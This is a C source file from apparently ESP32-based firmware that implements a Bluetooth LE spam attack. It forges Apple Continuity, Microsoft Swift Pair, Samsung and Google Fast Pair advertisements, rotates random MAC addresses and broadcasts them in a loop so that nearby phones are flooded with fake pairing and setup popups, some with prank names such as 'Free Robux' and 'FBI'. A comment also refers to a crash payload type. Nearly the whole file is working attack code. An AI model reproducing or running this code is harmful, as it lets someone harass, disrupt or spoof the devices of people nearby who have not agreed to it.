/**
 * @file ble_spam.c
 * @brief BLE spam attack implementation
 * 
 * This module handles BLE advertisement spam attacks including:
 * - Apple device spam (AirPods, Beats, AppleTV, etc.)
 * - Microsoft device spam
 * - Samsung device spam
 * - Google Fast Pair spam
 * - Flipper Zero spam
 * - Random spam (mix of all types)
 * 
 * Note: This module interfaces with ble_manager.c for BLE stack control
 * and shared state.
 */

#include "attacks/ble/ble_spam.h"
#include "managers/ble_manager.h"
#include "managers/rgb_manager.h"
#include "managers/status_display_manager.h"
#include "core/glog.h"
#include "esp_random.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "nimble/ble.h"
#include <string.h>

// External globals from ble_manager.c
extern RGBManager_t rgb_manager;

// ============================================================================
// Constants and Type Definitions
// ============================================================================

// Apple Continuity Protocol Support
typedef enum {
    CONTINUITY_TYPE_PROXIMITY_PAIR = 0x07,
    CONTINUITY_TYPE_NEARBY_ACTION = 0x0F,
    CONTINUITY_TYPE_CUSTOM_CRASH = 0x0F  // Same as nearby action but with special payload
} continuity_type_t;

// Apple device model definition
typedef struct {
    uint16_t model;
    const char* name;
    uint8_t colors[8];  // Up to 8 color options per device
    uint8_t color_count;
} apple_device_t;

// Apple/Beats device models with colors (reserved for future use)
static const apple_device_t apple_devices[] __attribute__((unused)) = {
    {0x0E20, "AirPods Pro", {0x00}, 1},
    {0x0A20, "AirPods Max", {0x00, 0x02, 0x03, 0x0F, 0x11}, 5},
    {0x0055, "AirTag", {0x00}, 1},
    {0x0030, "Hermes AirTag", {0x00}, 1},
    {0x0220, "AirPods", {0x00}, 1},
    {0x0F20, "AirPods 2nd Gen", {0x00}, 1},
    {0x1320, "AirPods 3rd Gen", {0x00}, 1},
    {0x1420, "AirPods Pro 2nd Gen", {0x00}, 1},
    {0x1020, "Beats Flex", {0x00, 0x01}, 2},
    {0x0620, "Beats Solo 3", {0x00, 0x01, 0x06, 0x07, 0x08, 0x09, 0x0E, 0x0F}, 8},
    {0x0320, "Powerbeats 3", {0x00, 0x01, 0x0B, 0x0C, 0x0D, 0x12, 0x13, 0x14}, 8},
    {0x0B20, "Powerbeats Pro", {0x00, 0x02, 0x03, 0x04, 0x05, 0x06, 0x0B, 0x0D}, 8},
    {0x0C20, "Beats Solo Pro", {0x00, 0x01}, 2},
    {0x1120, "Beats Studio Buds", {0x00, 0x01, 0x02, 0x03, 0x04, 0x06}, 6},
    {0x0520, "Beats X", {0x00, 0x01, 0x02, 0x05, 0x1D, 0x25}, 6},
    {0x0920, "Beats Studio 3", {0x00, 0x01, 0x02, 0x03, 0x18, 0x19, 0x25, 0x26}, 8},
    {0x1720, "Beats Studio Pro", {0x00, 0x01}, 2},
    {0x1220, "Beats Fit Pro", {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}, 8},
    {0x1620, "Beats Studio Buds+", {0x00, 0x01, 0x02, 0x03, 0x04}, 5}
};

// Nearby Action types (reserved for future use)
static const struct {
    uint8_t action;
    const char* name;
} nearby_actions[] __attribute__((unused)) = {
    {0x13, "AppleTV AutoFill"},
    {0x24, "Apple Vision Pro"},
    {0x05, "Apple Watch"},
    {0x27, "AppleTV Connecting..."},
    {0x20, "Join This AppleTV?"},
    {0x19, "AppleTV Audio Sync"},
    {0x1E, "AppleTV Color Balance"},
    {0x09, "Setup New iPhone"},
    {0x2F, "Sign in to other device"},
    {0x02, "Transfer Phone Number"},
    {0x0B, "HomePod Setup"},
    {0x01, "Setup New AppleTV"},
    {0x06, "Pair AppleTV"},
    {0x0D, "HomeKit AppleTV Setup"},
    {0x2B, "AppleID for AppleTV?"}
};

// AppleJuice device IDs for IOS1 category (AirPods/Beats family)
static const uint8_t IOS1_DEVICE_IDS[] = {
    0x02, // Airpods
    0x0e, // AirpodsPro
    0x0a, // AirpodsMax
    0x0f, // AirpodsGen2
    0x13, // AirpodsGen3
    0x14, // AirpodsProGen2
    0x03, // PowerBeats
    0x0b, // PowerBeatsPro
    0x0c, // BeatsSoloPro
    0x11, // BeatsStudioBuds
    0x10, // BeatsFlex
    0x05, // BeatsX
    0x06, // BeatsSolo3
    0x09, // BeatsStudio3
    0x17, // BeatsStudioPro
    0x12, // BeatsFitPro
    0x16, // BeatsStdBudsPlus
};

// AppleJuice device IDs for IOS2 category (Apple TV/HomePod family)
static const uint8_t IOS2_DEVICE_IDS[] = {
    0x01, // AppleTVSetup
    0x06, // AppleTVPair
    0x20, // AppleTVNewUser
    0x2b, // AppleTVAppleIDSetup
    0xc0, // AppleTVWirelessAudioSync
    0x0d, // AppleTVHomekitSetup
    0x13, // AppleTVKeyboard
    0x27, // AppleTVConnectingNetwork
    0x0b, // HomepodSetup
    0x09, // SetupNewPhone
    0x02, // TransferNumber
    0x1e, // TVColorBalance
    0x24, // AppleVisionPro
};

// Android/Google Fast Pair device models
typedef struct {
    uint32_t value;
} DeviceType;

static const DeviceType android_models[] = {
    // Genuine non-production/forgotten devices
    {0x0001F0}, // Bisto CSR8670 Dev Board
    {0x000047}, // Arduino 101
    {0x470000}, // Arduino 101 2
    {0x00000A}, // Anti-Spoof Test
    {0x00000B}, // Google Gphones
    {0x00000D}, // Test 00000D
    {0x000007}, // Android Auto
    {0x000009}, // Test Android TV
    {0x090000}, // Test Android TV 2
    {0x000048}, // Fast Pair Headphones
    {0x001000}, // LG HBS1110
    {0x00B727}, // Smart Controller 1
    {0x01E5CE}, // BLE-Phone
    {0x0200F0}, // Goodyear
    {0x00F7D4}, // Smart Setup
    {0xF00002}, // Goodyear
    {0xF00400}, // T10
    {0x1E89A7}, // ATS2833_EVB

    // Genuine devices
    {0xCD8256}, // Bose NC 700
    {0x0000F0}, // Bose QuietComfort 35 II
    {0xF00000}, // Bose QuietComfort 35 II 2
    {0x821F66}, // JBL Flip 6
    {0xF52494}, // JBL Buds Pro
    {0x718FA4}, // JBL Live 300TWS
    {0x0002F0}, // JBL Everest 110GA
    {0x92BBBD}, // Pixel Buds
    {0x000006}, // Google Pixel buds
    {0x060000}, // Google Pixel buds 2
    {0xD446A7}, // Sony XM5
    {0x038B91}, // DENON AH-C830NCW
    {0x02F637}, // JBL LIVE FLEX
    {0x02D886}, // JBL REFLECT MINI NC
    {0xF00001}, // Bose QuietComfort 35 II
    {0xF00201}, // JBL Everest 110GA
    {0xF00209}, // JBL LIVE400BT
    {0xF00205}, // JBL Everest 310GA
    {0xF00305}, // LG HBS-1500
    {0xF00E97}, // JBL VIBE BEAM
    {0x04ACFC}, // JBL WAVE BEAM
    {0x04AA91}, // Beoplay H4
    {0x04AFB8}, // JBL TUNE 720BT
    {0x05A963}, // WONDERBOOM 3
    {0x05AA91}, // B&O Beoplay E6
    {0x05C452}, // JBL LIVE220BT
    {0x05C95C}, // Sony WI-1000X
    {0x0602F0}, // JBL Everest 310GA
    {0x0603F0}, // LG HBS-1700
    {0x1E8B18}, // SRS-XB43
    {0x1E955B}, // WI-1000XM2
    {0x1EC95C}, // Sony WF-SP700N
    {0x06AE20}, // Galaxy S21 5G
    {0x06C197}, // OPPO Enco Air3 Pro
    {0x06C95C}, // Sony WH-1000XM2
    {0x06D8FC}, // soundcore Liberty 4 NC
    {0x0744B6}, // Technics EAH-AZ60M2
    {0x07A41C}, // WF-C700N
    {0x07C95C}, // Sony WH-1000XM2
    {0x07F426}, // Nest Hub Max
    {0x0102F0}, // JBL Everest 110GA - Gun Metal
    {0x054B2D}, // JBL TUNE125TWS
    {0x0660D7}, // JBL LIVE770NC
    {0x0103F0}, // LG HBS-835
    {0x0903F0}, // LG HBS-2000

    // Custom debug popups
    {0xD99CA1}, // Flipper Zero
    {0x77FF67}, // Free Robux
    {0xAA187F}, // Free VBucks
    {0xDCE9EA}, // Rickroll
    {0x87B25F}, // Animated Rickroll
    {0x1448C9}, // BLM
    {0x13B39D}, // Talking Sasquach
    {0x7C6CDB}, // Obama
    {0x005EF9}, // Ryanair
    {0xE2106F}, // FBI
    {0xB37A62}, // Tesla
    {0x92ADC9}, // Ton Upgrade Netflix
};

// Samsung watch models
typedef struct {
    uint8_t value;
    const char* name;
} WatchModel;

static const WatchModel watch_models[] = {
    {0x1A, "Fallback Watch"},
    {0x01, "White Watch4 Classic 44m"},
    {0x02, "Black Watch4 Classic 40m"},
    {0x03, "White Watch4 Classic 40m"},
    {0x04, "Black Watch4 44mm"},
    {0x05, "Silver Watch4 44mm"},
    {0x06, "Green Watch4 44mm"},
    {0x07, "Black Watch4 40mm"},
    {0x08, "White Watch4 40mm"},
    {0x09, "Gold Watch4 40mm"},
    {0x0A, "French Watch4"},
    {0x0B, "French Watch4 Classic"},
    {0x0C, "Fox Watch5 44mm"},
    {0x11, "Black Watch5 44mm"},
    {0x12, "Sapphire Watch5 44mm"},
    {0x13, "Purpleish Watch5 40mm"},
    {0x14, "Gold Watch5 40mm"},
    {0x15, "Black Watch5 Pro 45mm"},
    {0x16, "Gray Watch5 Pro 45mm"},
    {0x17, "White Watch5 44mm"},
    {0x18, "White & Black Watch5"},
    {0x1B, "Black Watch6 Pink 40mm"},
    {0x1C, "Gold Watch6 Gold 40mm"},
    {0x1D, "Silver Watch6 Cyan 44mm"},
    {0x1E, "Black Watch6 Classic 43m"},
    {0x20, "Green Watch6 Classic 43m"},
};

// Count macros
#define APPLE_DEVICES_COUNT (sizeof(apple_devices) / sizeof(apple_devices[0]))
#define NEARBY_ACTIONS_COUNT (sizeof(nearby_actions) / sizeof(nearby_actions[0]))
#define ANDROID_MODELS_COUNT (sizeof(android_models) / sizeof(android_models[0]))
#define WATCH_MODELS_COUNT (sizeof(watch_models) / sizeof(watch_models[0]))

// ============================================================================
// Apple Advertisement Payload Templates
// ============================================================================

// Apple proximity pair advertisement template (base structure)
// Format: [len][0xFF][0x4C][0x00][0x07][0x19][0x07][model_lo][model_hi][prefix][status][color][random...]
typedef struct {
    uint8_t len;           // 0x1E (30 bytes total for this field)
    uint8_t type;          // 0xFF (manufacturer specific)
    uint8_t company_lo;    // 0x4C (Apple)
    uint8_t company_hi;    // 0x00
    uint8_t continuity_type; // 0x07 (proximity pair)
    uint8_t data_len;      // 0x19 (25 bytes)
    uint8_t subtype;       // 0x07
    uint8_t model_lo;      // Device model low byte
    uint8_t model_hi;      // Device model high byte
    uint8_t prefix;        // 0x75
    uint8_t auth_tag_hi;   // 0xAA
    uint8_t auth_tag_lo;   // 0x30
    uint8_t status;        // 0x01
    uint8_t reserved[2];   // 0x00, 0x00
    uint8_t random[8];     // Random bytes
    uint8_t padding[4];    // 0x00 padding
} apple_proximity_adv_t;

// Apple nearby action advertisement template
typedef struct {
    uint8_t len;           // 0x16 (22 bytes total)
    uint8_t type;          // 0xFF (manufacturer specific)
    uint8_t company_lo;    // 0x4C (Apple)
    uint8_t company_hi;    // 0x00
    uint8_t continuity_type; // 0x04 (nearby action)
    uint8_t data_len;      // 0x04
    uint8_t subtype;       // 0x2A
    uint8_t reserved[3];   // 0x00, 0x00, 0x00
    uint8_t action_type;   // Action type byte
    uint8_t auth[8];       // Authentication data
} apple_nearby_adv_t;

// ============================================================================
// Local State
// ============================================================================

static volatile uint32_t spam_adv_count = 0;
static esp_timer_handle_t spam_log_timer = NULL;
static int spam_log_interval_ms = 5000;
static TaskHandle_t spam_task_handle = NULL;
static volatile bool spam_running = false;
static ble_spam_type_t current_spam_type = BLE_SPAM_APPLE;

// ============================================================================
// Helper Functions - Type Name Mapping
// ============================================================================

/**
 * @brief Get human-readable name for spam type
 */
static const char* spam_type_to_name(ble_spam_type_t type) {
    static const char* const type_names[] = {
        [BLE_SPAM_MICROSOFT]   = "Microsoft",
        [BLE_SPAM_APPLE]       = "Apple",
        [BLE_SPAM_SAMSUNG]     = "Samsung",
        [BLE_SPAM_GOOGLE]      = "Google",
        [BLE_SPAM_FLIPPERZERO] = "Flipper",
        [BLE_SPAM_RANDOM]      = "Random",
    };
    
    if (type >= 0 && type < sizeof(type_names) / sizeof(type_names[0])) {
        return type_names[type];
    }
    return "Unknown";
}

// ============================================================================
// Helper Functions - Random Generation
// ============================================================================

/**
 * @brief Generate random MAC address with proper BLE random address format
 */
static void generate_random_mac(uint8_t *mac_addr) {
    int attempts = 0;
    int ones;
    
    do {
        esp_fill_random(mac_addr, 6);
        
        // Set address type bits (bits 47:46)
        if (esp_random() % 2 == 0) {
            // Static random address (bits 47:46 = 11)
            mac_addr[5] |= 0xC0;
        } else {
            // Non-resolvable private address (bits 47:46 = 00)  
            mac_addr[5] &= 0x3F;
        }
        
        // Count bits set to 1 in random part (lower 46 bits)
        ones = __builtin_popcount(mac_addr[0]);
        ones += __builtin_popcount(mac_addr[1]);
        ones += __builtin_popcount(mac_addr[2]);
        ones += __builtin_popcount(mac_addr[3]);
        ones += __builtin_popcount(mac_addr[4]);
        ones += __builtin_popcount(mac_addr[5] & 0x3F);
        
        attempts++;
        if (attempts > 10) {
            // Fallback: ensure at least one bit is set and not all bits are set
            mac_addr[0] |= 0x01;  // Set at least one bit
            mac_addr[1] &= 0xFE;  // Clear at least one bit
            break;
        }
    } while (ones == 0 || ones == 46);
}

/**
 * @brief Generate random alphanumeric name
 */
static void generate_random_name(char *name, size_t max_len) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    size_t len = (esp_random() % (max_len - 1)) + 1;

    for (size_t i = 0; i < len; i++) {
        name[i] = charset[esp_random() % (sizeof(charset) - 1)];
    }
    name[len] = '\0';
}

// ============================================================================
// Helper Functions - Advertisement Data Building
// ============================================================================

/**
 * @brief Build Microsoft manufacturer specific data
 */
static void build_microsoft_mfg(const char *name, uint8_t *buf, size_t *len) {
    size_t name_len = strlen(name);
    buf[0] = 0x06;  // Microsoft beacon type
    buf[1] = 0x00;
    buf[2] = 0x03;
    buf[3] = 0x00;
    buf[4] = 0x80;
    memcpy(&buf[5], name, name_len);
    *len = 5 + name_len;
}

/**
 * @brief Build Apple manufacturer specific data (legacy format)
 */
static void build_apple_mfg(uint8_t *buf, size_t *len) {
    buf[0] = 0x4C;  // Apple company ID low
    buf[1] = 0x00;  // Apple company ID high
    
    int use_ios2 = esp_random() % 2;
    if (use_ios2) {
        buf[2] = 0x0F;  // Nearby action type
        buf[3] = 0x05;
        buf[4] = 0xC1;
        buf[5] = IOS2_DEVICE_IDS[esp_random() % (sizeof(IOS2_DEVICE_IDS)/sizeof(IOS2_DEVICE_IDS[0]))];
    } else {
        buf[2] = 0x0F;  // Proximity pair type
        buf[3] = 0x05;
        buf[4] = 0xC1;
        buf[5] = IOS1_DEVICE_IDS[esp_random() % (sizeof(IOS1_DEVICE_IDS)/sizeof(IOS1_DEVICE_IDS[0]))];
    }
    
    esp_fill_random(&buf[6], 3);
    buf[9] = 0x00;
    buf[10] = 0x00;
    buf[11] = 0x10;
    esp_fill_random(&buf[12], 3);
    *len = 15;
}

/**
 * @brief Build Samsung manufacturer specific data
 */
static void build_samsung_mfg(uint8_t *buf, size_t *len) {
    buf[0] = 0x75;  // Samsung company ID low
    buf[1] = 0x00;  // Samsung company ID high
    buf[2] = 0x01;
    buf[3] = 0x00;
    buf[4] = 0x02;
    buf[5] = 0x00;
    buf[6] = 0x01;
    buf[7] = 0x01;
    buf[8] = 0xFF;
    buf[9] = 0x00;
    buf[10] = 0x00;
    buf[11] = 0x43;
    uint8_t model = watch_models[esp_random() % WATCH_MODELS_COUNT].value;
    buf[12] = model;
    *len = 13;
}

/**
 * @brief Build Google Fast Pair manufacturer specific data
 */
static void build_google_mfg(uint8_t *buf, size_t *len) {
    uint32_t device_id = android_models[esp_random() % ANDROID_MODELS_COUNT].value;
    buf[0] = 0xE0;  // Fast Pair service UUID low
    buf[1] = 0x00;  // Fast Pair service UUID high
    buf[2] = 0x00;
    buf[3] = (device_id >> 16) & 0xFF;
    buf[4] = (device_id >> 8) & 0xFF;
    buf[5] = device_id & 0xFF;
    buf[6] = (esp_random() % 120) - 100;  // RSSI hint
    *len = 7;
}

// ============================================================================
// Helper Functions - Apple Continuity Protocol
// ============================================================================

/**
 * @brief Generate Apple Continuity Protocol proximity pair packet
 */
static void generate_proximity_pair_packet(uint8_t* adv_data, size_t* adv_len, uint16_t device_model, uint8_t color) {
    *adv_len = 0;
    
    // Flags
    adv_data[(*adv_len)++] = 0x02; // Length
    adv_data[(*adv_len)++] = 0x01; // Type: Flags
    adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
    
    // Apple Continuity Service Data
    adv_data[(*adv_len)++] = 0x1A; // Length (26 bytes)
    adv_data[(*adv_len)++] = 0x16; // Type: Service Data
    adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
    adv_data[(*adv_len)++] = 0xFE; 
    
    // Continuity Header
    adv_data[(*adv_len)++] = CONTINUITY_TYPE_PROXIMITY_PAIR; // Type: Proximity Pair
    adv_data[(*adv_len)++] = 0x15; // Length of data
    adv_data[(*adv_len)++] = 0x01; // Status flags
    
    // Device Model (little endian)
    adv_data[(*adv_len)++] = device_model & 0xFF;
    adv_data[(*adv_len)++] = (device_model >> 8) & 0xFF;
    
    // Status and Color
    adv_data[(*adv_len)++] = 0x00; // Status
    adv_data[(*adv_len)++] = color; // Color
    
    // Random data (encrypted payload simulation)
    for (int i = 0; i < 16; i++) {
        adv_data[(*adv_len)++] = esp_random() & 0xFF;
    }
}

/**
 * @brief Generate Apple Continuity Protocol nearby action packet
 */
static void generate_nearby_action_packet(uint8_t* adv_data, size_t* adv_len, uint8_t action_type) {
    *adv_len = 0;
    
    // Flags
    adv_data[(*adv_len)++] = 0x02; // Length
    adv_data[(*adv_len)++] = 0x01; // Type: Flags
    adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
    
    // Apple Continuity Service Data
    adv_data[(*adv_len)++] = 0x08; // Length (8 bytes)
    adv_data[(*adv_len)++] = 0x16; // Type: Service Data
    adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
    adv_data[(*adv_len)++] = 0xFE;
    
    // Continuity Header
    adv_data[(*adv_len)++] = CONTINUITY_TYPE_NEARBY_ACTION; // Type: Nearby Action
    adv_data[(*adv_len)++] = 0x03; // Length of data
    adv_data[(*adv_len)++] = action_type; // Action type
    adv_data[(*adv_len)++] = 0x00; // Action flags
    adv_data[(*adv_len)++] = 0x00; // Authentication tag
}

// ============================================================================
// Apple Advertisement Payload Generation (Table-Driven)
// ============================================================================

// Apple proximity pair device model IDs (for table-driven generation)
static const uint8_t apple_proximity_models[] = {
    0x20, 0x02,  // AirPods (0x0220)
    0x20, 0x0E,  // AirPods Pro (0x0E20)
    0x20, 0x0A,  // AirPods Max (0x0A20)
    0x20, 0x0F,  // AirPods Gen2 (0x0F20)
    0x20, 0x13,  // AirPods Gen3 (0x1320)
    0x20, 0x14,  // AirPods Pro Gen2 (0x1420)
    0x20, 0x03,  // PowerBeats (0x0320)
    0x20, 0x0B,  // PowerBeatsPro (0x0B20)
    0x20, 0x0C,  // BeatsSoloPro (0x0C20)
    0x20, 0x11,  // BeatsStudioBuds (0x1120)
    0x20, 0x10,  // BeatsFlex (0x1020)
    0x20, 0x05,  // BeatsX (0x0520)
    0x20, 0x06,  // BeatsSolo3 (0x0620)
    0x20, 0x09,  // BeatsStudio3 (0x0920)
    0x20, 0x17,  // BeatsStudioPro (0x1720)
    0x20, 0x12,  // BeatsFitPro (0x1220)
    0x20, 0x16,  // BeatsStudioBudsPlus (0x1620)
};

#define APPLE_PROXIMITY_MODEL_COUNT (sizeof(apple_proximity_models) / 2)

// Apple nearby action IDs
static const uint8_t apple_nearby_actions[] = {
    0x01,  // AppleTVSetup
    0x06,  // AppleTVPair
    0x20,  // AppleTVNewUser
    0x2B,  // AppleTVAppleIDSetup
    0xC0,  // AppleTVWirelessAudioSync
    0x0D,  // AppleTVHomekitSetup
    0x13,  // AppleTVKeyboard
    0x27,  // AppleTVConnectingNetwork
    0x0B,  // HomepodSetup
    0x09,  // SetupNewPhone
    0x02,  // TransferNumber
    0x1E,  // TVColorBalance
};

#define APPLE_NEARBY_ACTION_COUNT (sizeof(apple_nearby_actions) / sizeof(apple_nearby_actions[0]))

/**
 * @brief Build Apple proximity pair advertisement using template
 */
static void build_apple_proximity_adv(uint8_t *adv_data, size_t *adv_len) {
    uint32_t idx = esp_random() % APPLE_PROXIMITY_MODEL_COUNT;
    uint16_t model = apple_proximity_models[idx * 2] | (apple_proximity_models[idx * 2 + 1] << 8);
    uint8_t color = esp_random() % 12;  // Random color
    
    generate_proximity_pair_packet(adv_data, adv_len, model, color);
}

/**
 * @brief Build Apple nearby action advertisement using template
 */
static void build_apple_nearby_adv(uint8_t *adv_data, size_t *adv_len) {
    uint32_t idx = esp_random() % APPLE_NEARBY_ACTION_COUNT;
    uint8_t action = apple_nearby_actions[idx];
    
    generate_nearby_action_packet(adv_data, adv_len, action);
}

/**
 * @brief Build complete Apple advertisement (randomly selects proximity or nearby)
 */
static void build_apple_random_adv(uint8_t *adv_data, size_t *adv_len) {
    if (esp_random() % 2 == 0) {
        build_apple_proximity_adv(adv_data, adv_len);
    } else {
        build_apple_nearby_adv(adv_data, adv_len);
    }
}

// ============================================================================
// Advertisement Data Assembly Helpers
// ============================================================================

/**
 * @brief Add flags field to advertisement data
 */
static size_t adv_add_flags(uint8_t *adv_data, size_t offset) {
    adv_data[offset++] = 0x02;  // Length
    adv_data[offset++] = 0x01;  // Type: Flags
    adv_data[offset++] = 0x1A;  // LE General Discoverable + BR/EDR Not Supported
    return offset;
}

/**
 * @brief Add manufacturer specific data to advertisement
 */
static size_t adv_add_mfg_data(uint8_t *adv_data, size_t offset, const uint8_t *mfg_data, size_t mfg_len) {
    if (mfg_len > 0 && offset + mfg_len + 2 <= 31) {
        adv_data[offset++] = mfg_len + 1;  // Length including type
        adv_data[offset++] = 0xFF;          // Type: Manufacturer Specific
        memcpy(&adv_data[offset], mfg_data, mfg_len);
        offset += mfg_len;
    }
    return offset;
}

/**
 * @brief Build advertisement data from manufacturer buffer
 */
static void build_adv_from_mfg(uint8_t *adv_data, size_t *adv_len, const uint8_t *mfg_buf, size_t mfg_len) {
    *adv_len = adv_add_flags(adv_data, 0);
    *adv_len = adv_add_mfg_data(adv_data, *adv_len, mfg_buf, mfg_len);
}

// ============================================================================
// Spam Log Timer
// ============================================================================

static void spam_log_timer_cb(TimerHandle_t xTimer) {
    (void)xTimer;
    const char *type_name = spam_type_to_name(current_spam_type);
    glog("BLE Spam (%s): %lu packets sent\n", type_name, (unsigned long)spam_adv_count);
}

// ============================================================================
// Main Spam Task
// ============================================================================

static void spam_task(void *arg) {
    (void)arg;
    
    while (spam_running) {
        // Stop any active advertising
        if (ble_gap_adv_active()) {
            int rc = ble_gap_adv_stop();
            if (rc != 0) {
                glog("Warning: Failed to stop advertising (%d)\n", rc);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));

        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(20));
        }

        // Set random MAC for non-Apple spam types
        if (current_spam_type != BLE_SPAM_APPLE) {
            uint8_t rnd_addr[6];
            generate_random_mac(rnd_addr);
            int rc = ble_hs_id_set_rnd(rnd_addr);
            if (rc != 0) {
                glog("Warning: Failed to set random address (%d)\n", rc);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(10));

        // Build advertisement data based on spam type
        uint8_t adv_data[31];
        size_t adv_len = 0;
        uint8_t mfg_buf[31];
        size_t mfg_len = 0;
        bool use_direct_adv = false;

        switch (current_spam_type) {
            case BLE_SPAM_APPLE:
                // Apple uses direct advertisement building
                build_apple_random_adv(adv_data, &adv_len);
                use_direct_adv = true;
                break;
                
            case BLE_SPAM_MICROSOFT: {
                char name[8];
                generate_random_name(name, sizeof(name));
                build_microsoft_mfg(name, mfg_buf, &mfg_len);
                build_adv_from_mfg(adv_data, &adv_len, mfg_buf, mfg_len);
                break;
            }
            
            case BLE_SPAM_SAMSUNG:
                build_samsung_mfg(mfg_buf, &mfg_len);
                build_adv_from_mfg(adv_data, &adv_len, mfg_buf, mfg_len);
                break;
                
            case BLE_SPAM_GOOGLE:
                build_google_mfg(mfg_buf, &mfg_len);
                build_adv_from_mfg(adv_data, &adv_len, mfg_buf, mfg_len);
                break;
                
            case BLE_SPAM_FLIPPERZERO:
                // Flipper Zero uses Google Fast Pair with specific device ID
                build_google_mfg(mfg_buf, &mfg_len);
                build_adv_from_mfg(adv_data, &adv_len, mfg_buf, mfg_len);
                break;
                
            case BLE_SPAM_RANDOM: {
                // Random mix of all types
                int rand_type = esp_random() % 4;
                switch (rand_type) {
                    case 0: {
                        char name[8];
                        generate_random_name(name, sizeof(name));
                        build_microsoft_mfg(name, mfg_buf, &mfg_len);
                        build_adv_from_mfg(adv_data, &adv_len, mfg_buf, mfg_len);
                        break;
                    }
                    case 1:
                        // Apple Continuity
                        build_apple_random_adv(adv_data, &adv_len);
                        use_direct_adv = true;
                        break;
                    case 2:
                        build_samsung_mfg(mfg_buf, &mfg_len);
                        build_adv_from_mfg(adv_data, &adv_len, mfg_buf, mfg_len);
                        break;
                    case 3:
                        build_google_mfg(mfg_buf, &mfg_len);
                        build_adv_from_mfg(adv_data, &adv_len, mfg_buf, mfg_len);
                        break;
                }
                break;
            }
        }

        // Set advertisement data
        int rc = ble_gap_adv_set_data(adv_data, adv_len);
        if (rc != 0) {
            glog("Error: Failed to set advertisement data (%d)\n", rc);
            continue;
        }

        // Configure advertisement parameters
        struct ble_gap_adv_params adv_params;
        memset(&adv_params, 0, sizeof(adv_params));
        adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
        adv_params.disc_mode = (current_spam_type == BLE_SPAM_APPLE)
                                    ? BLE_GAP_DISC_MODE_GEN
                                    : BLE_GAP_DISC_MODE_NON;
        
        if (current_spam_type == BLE_SPAM_APPLE) {
            adv_params.itvl_min = 0xA0;  // ~100ms
            adv_params.itvl_max = 0xA0;
        } else {
            adv_params.itvl_min = 0x20;
            adv_params.itvl_max = 0x30;
        }
        adv_params.channel_map = 0x07;

        // Determine address type
        uint8_t own_addr_type = (current_spam_type == BLE_SPAM_APPLE)
                                     ? BLE_OWN_ADDR_PUBLIC
                                     : BLE_OWN_ADDR_RANDOM;
        
        // Start advertising
        uint32_t adv_ms = (esp_random() % 151) + 200;
        rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
        if (rc != 0) {
            glog("Error: Failed to start advertisement (%d)\n", rc);
            continue;
        }

        spam_adv_count++;

        // Wait for advertisement to complete
        uint32_t on_air_ms = (current_spam_type == BLE_SPAM_APPLE) ? 2000 : (adv_ms + 20);
        vTaskDelay(pdMS_TO_TICKS(on_air_ms));
        
        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
        }
        
        uint32_t idle_delay_ms = (current_spam_type == BLE_SPAM_APPLE) ? 15 : ((esp_random() % 51) + 50);
        vTaskDelay(pdMS_TO_TICKS(idle_delay_ms));
    }
    
    // Task cleanup - let stop function handle deletion
    vTaskSuspend(NULL);
}

// ============================================================================
// Public API
// ============================================================================

void ble_spam_start(ble_spam_type_t type) {
    if (spam_running) {
        glog("Spam already running, stopping first...\n");
        ble_spam_stop();
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    if (spam_task_handle != NULL) {
        glog("Cleaning up previous spam task...\n");
        if (eTaskGetState(spam_task_handle) != eDeleted) {
            vTaskDelete(spam_task_handle);
        }
        spam_task_handle = NULL;
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (!ble_is_initialized()) {
        ble_init();
    }

    if (!ble_wait_for_ready()) {
        glog("BLE not ready for spam\n");
        return;
    }

    current_spam_type = type;
    spam_adv_count = 0;
    spam_running = true;

    BaseType_t task_result = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle);
    if (task_result != pdPASS) {
        glog("Failed to create spam task (error: %d)\n", task_result);
        if (task_result == errCOULD_NOT_ALLOCATE_REQUIRED_MEMORY) {
            glog("Insufficient memory for spam task\n");
        }
        spam_running = false;
        spam_task_handle = NULL;
        return;
    }

    if (spam_log_timer == NULL) {
        esp_timer_create_args_t targs = {
            .callback = spam_log_timer_cb,
            .arg = NULL,
            .name = "spam_log"
        };
        esp_err_t timer_result = esp_timer_create(&targs, &spam_log_timer);
        if (timer_result != ESP_OK) {
            glog("Failed to create spam log timer (error: %d)\n", timer_result);
        }
    }
    
    if (spam_log_timer != NULL) {
        esp_timer_start_periodic(spam_log_timer, spam_log_interval_ms * 1000);
    }

    glog("BLE Spam advertising started (%s)\n", spam_type_to_name(type));
    status_display_show_status("BLE Spam On");
}

void ble_spam_stop(void) {
    if (!spam_running) {
        return;
    }
    
    spam_running = false;
    
    if (spam_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(500));
        
        if (eTaskGetState(spam_task_handle) != eDeleted) {
            vTaskDelete(spam_task_handle);
        }
        spam_task_handle = NULL;
    }
    
    if (spam_log_timer) {
        esp_timer_stop(spam_log_timer);
    }
    
    if (ble_gap_adv_active()) {
        ble_gap_adv_stop();
    }
    
    glog("BLE Spam advertising stopped\n");
    status_display_show_status("BLE Spam Off");
}

bool ble_spam_is_running(void) {
    return spam_running;
}
